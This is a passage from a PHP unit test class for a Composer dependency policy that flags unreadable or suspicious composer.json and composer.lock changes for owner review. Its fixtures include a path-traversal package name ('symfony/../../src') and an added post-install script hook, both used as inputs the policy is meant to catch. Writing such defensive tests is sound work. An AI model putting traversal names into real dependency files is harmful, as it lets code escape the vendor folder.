        yield 'a package without a name' => ['{"packages": [{"version": "1.0.0"}]}', 'composer.lock cannot be read: a locked package has no name or version'];
        yield 'a package locked twice' => ['{"packages": [{"name": "symfony/uid", "version": "v8.0.0"}, {"name": "Symfony/Uid", "version": "v8.0.1"}]}', 'composer.lock cannot be read: packages locks a package twice'];
        yield 'a package in both groups' => ['{"packages": [{"name": "symfony/uid", "version": "v8.0.0"}], "packages-dev": [{"name": "symfony/uid", "version": "v8.0.0"}]}', 'composer.lock cannot be read: a package is in both the main and the development group'];
        yield 'stability flags that are no map' => ['{"stability-flags": [10]}', 'composer.lock cannot be read: stability-flags is no map of package names'];
        yield 'a stability flag for a number' => ['{"stability-flags": {"symfony/console": 10, "0": 10}}', 'composer.lock cannot be read: stability-flags names a package by a number'];
    }

    #[DataProvider('unreadableLocks')]
    public function testAnUnreadableLockFileNeedsTheOwner(string $lock, string $reason): void
    {
        $after = new DependencyFiles([...ComposerFiles::sample()->files()->contents, 'composer.lock' => $lock]);

        $decision = new ComposerPolicy($this->trusted(), LockedCommits::upstream())->decide(ComposerFiles::sample()->files(), $after);

        self::assertSame(['composer.lock: '.$reason], $this->findingsOf($decision));
    }

    /**
     * @return iterable<string, array{string, string}>
     */
    public static function unreadableManifests(): iterable
    {
        yield 'an empty list' => ['[]', 'composer.json cannot be read: it holds no JSON object'];
        yield 'a constraint that is no string' => ['{"require": {"symfony/uid": 8}}', 'composer.json cannot be read: the constraint of symfony/uid in require is no string'];
        yield 'a requirement named twice' => ['{"require": {"symfony/uid": "^8.0", "Symfony/Uid": "^7.0"}}', 'composer.json cannot be read: require names a package twice'];
        yield 'a requirement in both sections' => ['{"require": {"symfony/uid": "^8.0"}, "require-dev": {"symfony/uid": "^8.0"}}', 'composer.json cannot be read: a package is in both the main and the development group'];
        yield 'a requirement named by a number' => ['{"require": {"symfony/uid": "^8.0", "0": "^1.0"}}', 'composer.json cannot be read: require names a package by a number'];
    }

    #[DataProvider('unreadableManifests')]
    public function testAnUnreadableManifestNeedsTheOwner(string $manifest, string $reason): void
    {
        $after = new DependencyFiles(['composer.json' => $manifest]);

        $decision = new ComposerPolicy($this->trusted(), LockedCommits::upstream())->decide(ComposerFiles::none()->files(), $after);

        self::assertSame(['composer.json: '.$reason], $this->findingsOf($decision));
    }

    /**
     * @return iterable<string, array{string}>
     */
    public static function namesThatAreNoPackageNames(): iterable
    {
        yield 'a path out of the vendor folder' => ['symfony/../../src'];
        yield 'a folder below the package' => ['symfony/a/b'];
        yield 'a backslash' => ['symfony/u\\id'];
        yield 'a space' => ['symfony/u id'];
    }

    #[DataProvider('namesThatAreNoPackageNames')]
    public function testALockedPackageNamedOutsideComposersNameRuleNeedsTheOwner(string $name): void
    {
        $after = ComposerFiles::sample()->locking(ComposerFiles::inRepository(ComposerFiles::entry($name, 'v8.0.0', LockedCommits::UID_8_0_0), 'symfony/uid'));

        self::assertSame(
            [sprintf('composer.lock: composer.lock cannot be read: a locked package is named "%s", which is no package name', $name)],
            $this->findingsOf($this->decide(ComposerFiles::sample(), $after)),
        );
    }

    #[DataProvider('namesThatAreNoPackageNames')]
    public function testARequirementNamedOutsideComposersNameRuleNeedsTheOwner(string $name): void
    {
        $after = ComposerFiles::sample()->requiring($name, '^8.0');

        self::assertSame(
            [sprintf('composer.json: composer.json cannot be read: require names "%s", which is no package name', $name)],
            $this->findingsOf($this->decide(ComposerFiles::sample(), $after)),
        );
    }

    #[DataProvider('namesThatAreNoPackageNames')]
    public function testAStabilityFlagNamedOutsideComposersNameRuleNeedsTheOwner(string $name): void
    {
        $after = ComposerFiles::sample()->withLockKey('stability-flags', [$name => 10]);

        self::assertSame(
            [sprintf('composer.lock: composer.lock cannot be read: stability-flags names "%s", which is no package name', $name)],
            $this->findingsOf($this->decide(ComposerFiles::sample(), $after)),
        );
    }

    public function testPlatformRequirementsAndNamesWithCapitalsDotsAndDashesAreRead(): void
    {
        $before = ComposerFiles::sample()->requiring('ext-intl', '*')->requiring('lib-icu', '>=70')->requiring('composer-runtime-api', '^2.2')->requiring('php-64bit', '*')
            ->requiring('Symfony/Polyfill--Php_8.5', '^1.0')->locking(ComposerFiles::entry('Symfony/Polyfill--Php_8.5', 'v1.0.0', LockedCommits::OTHER))
            ->withLockKey('stability-flags', ['symfony/polyfill--php_8.5' => 10]);

        self::assertSame([], $this->findingsOf($this->decide($before, $before->withLockKey('content-hash', 'eee'))));
    }

    public function testAnEmptyLockFileObjectIsRoutine(): void
    {
        $decision = new ComposerPolicy($this->trusted(), LockedCommits::upstream())->decide(new DependencyFiles([]), new DependencyFiles(['composer.lock' => '{}']));

        self::assertSame([], $this->findingsOf($decision));
    }

    public function testAnUnreadableLockFileAtTheBaseNeedsTheOwnerToo(): void
    {
        $before = new DependencyFiles(['composer.lock' => 'not json']);

        $decision = new ComposerPolicy($this->trusted(), LockedCommits::upstream())->decide($before, ComposerFiles::sample()->files());

        self::assertTrue($decision->needsOwner());
        self::assertSame('composer.lock', $decision->findings[0]->subject);
    }

    public function testAChangeBeyondRoutineNamesEveryNewPackage(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')->requiring('acme/tool', '^1.0')
            ->locking(ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0))
            ->locking(ComposerFiles::entry('acme/tool', '1.0.0', LockedCommits::OTHER))
            ->withManifestKey('scripts', ['post-install-cmd' => 'acme-setup']);

        $decision = $this->decide(ComposerFiles::sample(), $after);

        self::assertTrue($decision->needsOwner());
        self::assertSame(['acme/tool', 'symfony/uid'], $decision->newPackages);
    }

    private function decide(ComposerFiles $before, ComposerFiles $after, ?RecordedUpstreamTags $tags = null): DependencyDecision
    {
        return new ComposerPolicy($this->trusted(), $tags ?? LockedCommits::upstream())->decide($before->files(), $after->files());
    }

    private function trusted(): TrustedPackages
    {
        return new TrustedPackages(ComposerPolicyConfiguration::DEFAULT_VENDORS, ComposerPolicyConfiguration::DEFAULT_TYPES);
    }

    /**
     * @return list<string>
     */
    private function findingsOf(DependencyDecision $decision): array
    {
        return array_map(static fn (DependencyFinding $finding): string => $finding->subject.': '.$finding->reason, $decision->findings);
    }
}
